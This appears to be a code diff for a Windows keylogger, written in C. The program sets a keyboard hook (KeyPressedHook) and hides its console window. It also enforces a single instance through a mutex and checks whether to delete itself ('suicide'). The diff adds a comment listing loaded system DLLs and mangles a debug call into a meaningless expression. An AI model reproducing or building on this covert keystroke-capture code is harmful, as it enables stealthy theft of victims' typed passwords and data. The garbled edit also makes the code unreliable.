@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <wchar.h>
 #include "config.h"
+#include "utils.h"
 #include "keyboard.h"
 #include "logging.h"
 
@@ -13,7 +14,7 @@ LRESULT WINAPI KeyPressedHook(int nCode, WPARAM wParam, LPARAM lParam)
 	WCHAR wcTempBuffer[BUFFER_SIZE]		= { 0 };
 
 	// Debug
-	DebugMessage(L"KeyPressedHook");
+	(L"KeyPressedHook");
 
 	// nCode must be not negative
 	if (nCode >= 0)
@@ -63,6 +64,22 @@ void UnRegisterHook(HHOOK keyboardHook)
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+	/*
+	Windows libraries
+	Loaded 'C:\windows\SYSTEM32\ntdll.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\kernel32.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\KernelBase.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\advapi32.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\msvcrt.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\sechost.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\rpcrt4.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\bcrypt.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\user32.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\win32u.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\gdi32.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\gdi32full.dll'. Symbols loaded.
+	Loaded 'C:\windows\System32\msvcp_win.dll'. Symbols loaded.	
+	*/
 	// Make sure there's a single instance of ourselves
 	HANDLE hMutexSingleInstance = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, MUTEX_SINGLE_INSTANCE);
 	// Mutex already opened, this means there's an instance already running.. shutting down.
@@ -76,7 +93,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	// Hide Window
 	ShowWindow(FindWindow("ConsoleWindowClass", NULL), 0);
-
 	// Check if we need to suicide. If so, suicide :(
 	if (CheckAndSuicideIfNeeded())
 	{
